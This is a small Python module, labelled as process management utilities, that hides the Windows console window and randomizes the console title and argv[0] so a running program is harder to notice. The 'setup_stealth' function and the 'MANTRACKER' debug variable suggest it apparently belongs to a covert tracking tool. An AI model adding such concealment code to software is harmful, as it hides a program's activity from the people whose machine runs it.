"""
System process management utilities
"""
import sys
import os
import random
import string


def _gen_random_title(length=None):
    """Generate random non-descriptive title"""
    if length is None:
        length = random.randint(8, 16)
    # Mix of CJK-like unicode and random chars
    chars = []
    for _ in range(length):
        r = random.random()
        if r < 0.4:
            chars.append(chr(random.randint(0x4e00, 0x9fff)))
        elif r < 0.7:
            chars.append(chr(random.randint(0x3040, 0x309f)))
        else:
            chars.append(random.choice(string.ascii_letters + string.digits))
    return ''.join(chars)


def hide_console_window():
    """Hide the console window (Windows only)"""
    if sys.platform != "win32":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except Exception:
        pass


def randomize_process_name():
    """Set console title and argv[0] to random string"""
    if sys.platform != "win32":
        return
    try:
        import ctypes
        title = _gen_random_title()
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception:
        pass

    # Overwrite argv[0]
    random_name = _gen_random_title(10) + ".exe"
    sys.argv[0] = random_name


def setup_stealth(debug=False):
    """Full stealth setup: hide console + randomize process name
    
    Args:
        debug: If True, skip hiding console for debugging
    """
    # Check environment variable for debug mode
    if os.environ.get('MANTRACKER_DEBUG', '').lower() in ('1', 'true', 'yes'):
        debug = True
    
    randomize_process_name()
    if not debug:
        hide_console_window()
